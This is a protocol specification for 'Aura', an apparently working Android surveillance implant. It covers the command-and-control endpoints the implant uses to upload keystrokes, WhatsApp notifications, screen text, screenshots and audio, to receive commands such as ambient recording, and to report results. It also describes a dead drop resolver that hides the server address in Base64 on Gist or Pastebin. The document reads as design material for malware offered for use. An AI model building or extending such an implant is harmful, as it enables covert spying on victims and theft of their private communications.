# Aura Communication Protocol Spec

This document details the HTTP/REST interface used for data synchronization and command-and-control (C2) between the **Aura** Android implant and the backend server.

---

## 📡 1. Synchronization Flow (`POST /api/sync`)

The implant performs an asynchronous batch sync typically every 15 minutes.

### 📝 Request Structure
**Header:** `Content-Type: application/json`
**Endpoint:** `http://<C2_SERVER>/api/sync`

```json
{
  "device_id": "8c4f2e1a3b5d790f",
  "model": "Samsung SM-S901B",
  "android_version": "34",
  "data": {
    "keylogs": [
      { "text": "H", "timestamp": "2026-04-07 23:45:01" },
      { "text": "e", "timestamp": "2026-04-07 23:45:02" }
    ],
    "notifications": [
      { "package": "com.whatsapp", "title": "John Doe", "text": "Hey!", "timestamp": "..." }
    ],
    "locations": [],
    "screen_texts": [
      { "package": "com.whatsapp", "text": "WhatsApp Chat Interface", "timestamp": "..." }
    ]
  }
}
```

### 📝 Response Structure
```json
{
  "status": "ok",
  "commands": [
    {
      "id": 142,
      "command": "screenshot",
      "params": ""
    },
    {
      "id": 143,
      "command": "start_surround",
      "params": ""
    }
  ]
}
```

---

## 📁 2. File Exfiltration (`POST /api/upload`)

Used for uploading screenshots, audio recordings, and dumped database files.

### 📝 Request Structure
```json
{
  "device_id": "8c4f2e1a3b5d790f",
  "type": "screenshot",
  "data": "BASE64_ENCODED_BINARY_DATA",
  "ext": ".png",
  "timestamp": "2026-04-07 23:50:00"
}
```

---

## ⚙️ 3. Command Acknowledgement (`POST /api/command_result`)

Reports the result of an executed command back to the dashboard.

### 📝 Request Structure
```json
{
  "command_id": 142,
  "result": "Screenshot captured: /data/user/0/com.example/files/scr_1.png"
}
```

---

## 📡 4. Dead Drop Resolver (DDR) Encoding

Aura resolves the C2 address by parsing public pages for a specific marker.

### Marker Format
The resolver searches for the following string within the HTML content of the target URL:
`[DDR_START]<ENCODED_URL>[DDR_END]`

### Encoding Scheme (v3.1)
The `<ENCODED_URL>` is a **Base64**-encoded string of the target server URL. 

**Example:**
- **URL**: `http://159.65.147.39:8080`
- **Base64**: `aHR0cDovLzE1OS42NS4xNDcuMzk6ODA4MA==`
- **DDR Payload**: `[DDR_START]aHR0cDovLzE1OS42NS4xNDcuMzk6ODA4MA==[DDR_END]`

### Logic in DeadDropResolver.java
1.  Connect to Gist/Pastebin via `HttpURLConnection`.
2.  Read full page source as String.
3.  Execute `substring(indexOf("[DDR_START]") + 11, indexOf("[DDR_END]"))`.
4.  Decode Base64 to UTF-8 String.
5.  Validate if it starts with `http://` or `https://`.
